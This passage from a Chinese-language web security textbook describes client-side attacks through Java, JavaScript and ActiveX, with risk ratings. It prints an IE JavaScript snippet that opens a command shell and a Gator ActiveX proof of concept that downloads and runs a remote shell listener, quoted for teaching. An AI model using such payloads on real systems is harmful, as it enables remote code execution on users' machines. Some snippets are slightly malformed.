

# 攻破Web应用程序

与服务器端 Web 平台类似，今天使用的两种两种主流客户端活动内容技术分别来自微软（ActiveX）和其竞争对手（Sun 的 Java）。让我们来讨论一下这些平台以及与它们相关的已知安全漏洞。

# Java 和 JavaScript

Sun Microsystems 的 Java 作为“移动代码”范式之一，为开发者提供了一个在 Web 上进行客户端执行的平台，它至今仍然是互联网上主流开发工具之一。其原因之一是 Java 提供的安全模型。凭借其透明的内存和集成的安全“沙箱”（该沙箱控制代码执行滥用操作的能力），Java 在理论是一个难以攻破的执行环境。正如我们在 Brown Oracle 案例中看到的，理论在实践中往往会被打破。在 2002 年 3 月的案例中，Sun 为其 Java 运行时（JRE）字节码验证器发布了一个修复程序，防止不可信的 Java Applet 通过执行非法类型转换逃逸沙箱，否则攻击者可以在沙箱之外设计任意代码，并执行与执行代码的用户权限级别相关的任何操作。

JavaScript 是另一个让攻击者获益匪浅的对象。JavaScript 是一种脚本语言，可用于 Web 应用程序客户端和服务器端的任务自动化。它由 Netscape Communications 公司创建，实际上并不受原始 Java 语言创建者 Sun 的支持。

与其他语言一样，JavaScript 主要用于用于将其他组件连接在一起或接受用户输入。它是一种解释型高级语言，使用的语法与 C 和 Java 相似。解释器（也称为“引擎”）获取纯文本 JavaScript 代码，并将其实时翻译为当前机器上的原生指令。JavaScript 解释器已内置在大多数主流 Web 浏览器中，其自动化能力使其成为易受攻击的 target。

# JavaScript 对象执行

| 流行度 | 7 |
|---|---|
| 简单性 | 7 |
| 影响 | 8 |
| 风险等级 | 7 |

在 Internet Explorer Fun Run 页面（本章末尾的“参考文献和进一步阅读”）可以找到许多利用 JavaScript 的示例技术列表。Fun Run 展示了 JavaScript 在远程 Internet Explorer 6 客户端上执行命令的能力，包括打开命令 shell、注册表编辑器、FTP

![](img/2c61c2d28445b774d9266972920f432d_306_0.png)

# 第12 章：Web 客户端攻击

client 以及多个 Windows 控制面板。下面显示了一个利用 JavaScript 代码片段（注意此示例的路径已设置为 Windows 2000 的默认路径 c:\windows\system32）；



```
<SCRIPT language=JavaScript>
var oPopup = window.createPopup();

function openPopupCMD() {
  var oPopBody = oPopup.document.body;
  oPopBody.innerHTML = '<OBJECT NAME="x"
  CLASSID="CLSID:11111111-1111-1111-111111111111"
  CODEBASE="c:/windows/system32/cmd.exe">
</OBJECT>';
  oPopBody.show(290, 190, 200, 200, document.body);
}
</SCRIPT>
<P onclick=openPopupCMD()><U><FONT color=#3333ff></FONT></U></P>
```

上述代码在点击“Command（命令）”时会在系统上打开一个 shell。一旦实例化，该 shell 就可以被脚本化并在客户端上执行后续操作，并在点击链接的用户上下文中运行。

我们将在接下来的名为“活动内容防御措施”的部分中讨论此类攻击的防御措施。但首先，让我们讨论一下今天网上现有的其他主要活动内容平台。

# ActiveX

尽管微软在其产品中利用 JavaScript 进行客户端脚本编写，但它也发明了自己的用于客户端自动化的模型 ActiveX。ActiveX 实际上是微软庞大的组件对象模型（COM）软件架构的一部分，该架构允许从二进制软件组件构建应用程序。可重用的 ActiveX 组件（称为“控件”）可以提供一系列常用的系统功能，包括组件绑定、应用程序间脚本、数据传输以及其他软件交互。

与 JavaScript 类似，ActiveX 是操纵客户端环境的强大工具。微软开发了名为 Authenticode 的技术，试图防止 ActiveX 被广泛滥用。在执行控件之前，Authenticode 会验证附加在控件上的数字签名，并向用户显示对话框，询问他们是否想要运行该控件。数字签名通常由控件开发者从微软或受信任的第三方（如 VeriSign）获取。

许多读者会注意到，Authenticode 范式并没有说明给定控件在执行后可以做什么——它仅仅验证了签名代码的人的身份。身份通常仍与“安全”相关联，但不应该是。它实际上更多是关于对提供控件实体的信任。这种信任可以通过两种方式被背叛：

- 可以被恶意操纵的签名控件。
- 标记为“安全”但绕过 Authenticode 的控件。

我们将在接下来的两个节中讨论每种攻击的示例。之后我们将讨论活动内容攻击的防御措施。

# Gator 签名 ActiveX 控件攻击

| 流行度: | 5 |
| 简单性: | 7 |
| 影响: | 10 |
| 风险等级: | 7 |

2002 年，EyeOnSecurity.net 就其 Gator EWallet 软件产品发布了安全公告。该漏洞实际上存在用于安装该产品的 Gator Setup ActiveX 控件中。Gator Setup 是一个签名控件，它会寻找名为 setup.ex_ 的文件，将其解压并执行。作为 sign签名控件，用户会看到 Authenticode 安装对话框，提示他们安装控件（如图 12-1 所示）。

如果系统中之前安装了 Gator 控件，恶意的 Web 页面或电子邮件就可以调用它，利用它从恶意站点下载文件，然后执行它（只要文件名为 setup.ex_）。这是一个 Authenticode 验证了控件的合法性，但没有验证其操作是否安全的经典示例。

EyeOnSecurity 在公告中发布了概念代码，展示了如何使用标准的 HTML <OBJECT> 标签调用 Gator Setup 控件。他们还演示了如何使用控件参数从他们的网站下载名为 setup.ex_ 的文件，然后执行它。setup.ex_ 文件实际上是重命名后的 tine.exe，它在端口 7777 上设置了一个监听 shell。

```html
<object
id="IEGator"
class="CLASSID:29EEFF42-F3FA-11D5-A9D5-0050041353C"
<param name="params"
  value="fcn=setup&src=eyeonsecurity.net/advisories/gatorxoit/
  setup.ex_&bgcolor=F0F1D0&aic=,aicStr,"&"
</object>
```

![](img/2c61c2d28445b774d9266972920f432d_309_0.png)

**图 12-1.** Authenticode 对话框询问用户是否安装 Gator Setup 控件。

# 脚本安全

| | |
|------|
| 流行度: | 9 |
| 简单性: | 7 |
| 影响: | 10 |
| 风险等级: | 9 |

1999年中，安全人员 Georgi Guninski 和 Richard M. Smith 同时发布了关于标记为“脚本安全”的 ActiveX 控件恶意滥用的公告。通过在他们的控件中设置此“脚本安全”标记，开发者可以完全绕过正常的 Authenticode 签名检查。此类控件的两个示例是

